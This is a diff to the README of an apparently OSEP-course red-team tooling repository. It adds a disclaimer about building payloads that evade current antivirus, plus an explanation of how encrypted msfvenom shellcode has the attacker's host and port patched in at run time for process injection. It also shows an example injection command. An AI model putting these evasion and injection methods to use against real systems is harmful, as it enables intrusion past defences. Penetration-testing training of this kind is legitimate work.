@@ -1,3 +1,11 @@
+# Disclaimer
+
+All of these tools were developed for use in the OSEP course.  During development of them, as I learned more, in many cases I went above and beyond what the course taught because I figured "Why not build things against latest patch AV?".  That is not to say that all of the things in this repo were beating Live Defender; however at one point or another, most of them were.  I hope that they may be of use to others, either for direct usage or to serve as inspiration for further work.
+
+There is very little in terms of actual novel tradecraft here; it is a combination of a myriad of resources provided by people far smarter than I.  The majority of the heavy lifting I did here was towards automation.  I wanted an easy, standardized way to generate payloads for use in the OSEP course.
+
+I offer no guarantees of any kind when using this stuff.  Nothing in here was designed for public release, I am doing so after many requests.  Make sure you read the notes provided on each tool in this README.
+
 # Tools
 
 Powerinject.py - Python3 script to generate .PS1 payloads that perform process injection.
@@ -47,7 +55,7 @@ D_invoke:
 
 This is a package built using TheWover's project and research as the foundation (https://github.com/TheWover/DInvoke, https://thewover.github.io/Dynamic-Invoke/).
 
-The inspiration for this project was to simplify the process of generating compled C# payloads.  Using this project the user never need open visual studio.
+The inspiration for this project was to simplify the process of generating compled C# payloads.  By using this project, a user never need open visual studio when creating payloads.
 
 The steps for usage are this:
 
@@ -80,7 +88,7 @@ Run the appropriate python script for the kind of payload you want to use and th
 
 Clinject and Clhollow:
 
-These are C# projects that have been modified in order to accept command line Lhost, Lport, and processes for targeting.  This allows a user to drop the payload on whatever target machine without worry of needing to re-roll shellcode if the attackers IP changes, or the payload needs to be pointed at a different machine in order to hit a tunnel and egress the network. 
+These are C# projects that have been modified in order to accept command line Lhost, Lport, and processes for targeting.  This allows a user to drop the payload on whatever target machine without worry of needing to re-roll shellcode if the attackers IP changes, or the payload needs to be pointed at a different machine in order to hit a tunnel and egress the network.  This was accomplished by using Msfvenom to create shellcode and then locating the IP and port that was specified in the msfvenom command within the output shellcode.  These bytes were replaced with unique identifier strings.  This process was accomplished with the "Port_ipeggs.py" script.  This shellcode was then AES encrypted and placed in the C# project and functionality added to received command line args specifying the Lport and Lhost.  On run time, the shellcode is decrypted and then the IP and port given by the attacker is converted to hex and placed in the proper location wthin the decyrpted shellcode as marked by the unique identifer string.
 
 Example usage: clinject.exe 192.168.1.1 443 explorer
 
